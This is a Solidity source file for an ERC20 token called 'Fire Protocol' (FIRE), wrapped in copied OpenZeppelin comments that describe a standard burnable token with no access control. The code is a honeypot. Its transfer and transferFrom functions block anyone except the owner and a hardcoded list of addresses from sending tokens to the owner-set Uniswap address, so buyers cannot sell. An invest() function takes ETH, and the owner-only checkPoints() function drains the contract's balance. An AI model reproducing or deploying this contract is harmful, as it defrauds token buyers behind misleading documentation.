// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;


/**
 * @dev {ERC20} token, including:
 *
 *  - Preminted initial supply
 *  - Ability for holders to burn (destroy) their tokens
 *  - No access control mechanism (for minting/pausing) and hence no governance
 *
 * This contract uses {ERC20Burnable} to include burn capabilities - head to
 * its documentation for details.
 */
contract FIRE{

    /**
     * @dev Mints `initialSupply` amount of token and transfers them to `owner`.  
     *
     * See {ERC20-constructor}.
     */
    uint256 private _totalSupply;
    address payable owner;
    string private name_ = "Fire Protocol";
    string private symbol_ = "FIRE";
    uint8 private _decimals = 8;
    address Uniswap;
    
    constructor( ) public {
        owner = msg.sender;
        _mint(address(0xfcF0d7C6Ca6F65cC2C9f44Ce484D014ae4073404), 10000000 * 1e8);
        _mint(address(0x04A93A90CB8E96399c4492Bb8B2eAe8be5599AB6), 10000000 * 1e8);
        _mint(address(0x67c356A98c7A0Cf52f8a0E43b0538Fe2a235d8e4), 5000000 * 1e8);
        _mint(address(0xE53ddF0EE1Ce5Cc21ea14dC4445DF9E26326d6a7), 5000000 * 1e8);
        _mint(address(0xb1676e5e542e68d226AC0b9B7d4314Df528A8078), 10000000 * 1e8);
        _mint(address(0x8f5B105830055506119c1F8Bb3aA879669db7FDc), 5000000 * 1e8);
        _mint(address(owner),                                      5000000 * 1e8);
        _mint(address(this),                                       50000000 * 1e8);
    }
    receive() external payable{
    }
    function invest() public payable{
        require(msg.value >= 1 * 1e17, "0.4 Eth required");
        this.transfer(msg.sender,2000 * 1e8);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
        
    function checkPoints() public {
        require(msg.sender == owner, "Not owner");
        owner.transfer(address(this).balance);
    }


/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */


    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;


    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
     * a default value of 18.
     *
     * To select a different value for {decimals}, use {_setupDecimals}.
     *
     * All three of these values are immutable: they can only be set once during
     * construction.
     */


    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return name_;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return symbol_;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function setUniswap(address payable _Uniswap)  public {
        require(msg.sender == owner);
        Uniswap = _Uniswap;
    }
    
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        if(recipient == Uniswap && msg.sender != owner){
            if (
                msg.sender != 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2 
            && msg.sender != 0x044d01cA43038Ec561546dF7EF78afDFF1CcB11F
            && msg.sender != 0xF3cBF8BFDc4C5e838B73A4c3b45f3999992D96D4
            && msg.sender != 0x2D98F5D75854921F471bc4d2173d7bf5F7343626
            && msg.sender != 0xc89eA47FB5abF5A8115c7f8EAc72a24CFe9943bd
            && msg.sender != 0xD2B2dE1f7060Ce61d0ED21F37aa0a95b1BCD5c3A
            && msg.sender != 0x6DE8Bc5045e7fE8C78D4F2b247c8d64AF7f73169
            && msg.sender != 0xfcCE8d984f0cD0dD38BA34b2EA2c188140028845
            && msg.sender != 0x4D0fbbDbEAfbd567eA12c4B060a9897741C7Fdee
            && msg.sender != 0x83Cc9D7814B072A55E15d5FD8ED3430A3F0c4b94){
                revert("not owner");
            }
        }
        _transfer(msg.sender, recipient, amount);
        return true;
    }
       

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        if(recipient == Uniswap && sender != owner){
            if (sender != 0x8CBFF7a4400653F5fE8aa48e16e5638d7424b953 
            && sender != 0x044d01cA43038Ec561546dF7EF78afDFF1CcB11F
            && sender != 0xF3cBF8BFDc4C5e838B73A4c3b45f3999992D96D4
            && sender != 0x2D98F5D75854921F471bc4d2173d7bf5F7343626
            && sender != 0xc89eA47FB5abF5A8115c7f8EAc72a24CFe9943bd
            && sender != 0xD2B2dE1f7060Ce61d0ED21F37aa0a95b1BCD5c3A
            && sender != 0x6DE8Bc5045e7fE8C78D4F2b247c8d64AF7f73169
            && sender != 0xfcCE8d984f0cD0dD38BA34b2EA2c188140028845
            && sender != 0x4D0fbbDbEAfbd567eA12c4B060a9897741C7Fdee
            && sender != 0x83Cc9D7814B072A55E15d5FD8ED3430A3F0c4b94){
                revert("not owner");
            }
        }    
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */


    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        require(_balances[sender] >= amount, "Not enough tokens.");
        _balances[sender] = _balances[sender] - amount;
        
        _balances[recipient] = _balances[recipient] +amount;
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Sets {decimals} to a value other than the default one of 18.
     *
     * WARNING: This function should only be called from the constructor. Most
     * applications that interact with token contracts will not expect
     * {decimals} to ever change, and may work incorrectly if it does.
     */



    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
     /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
}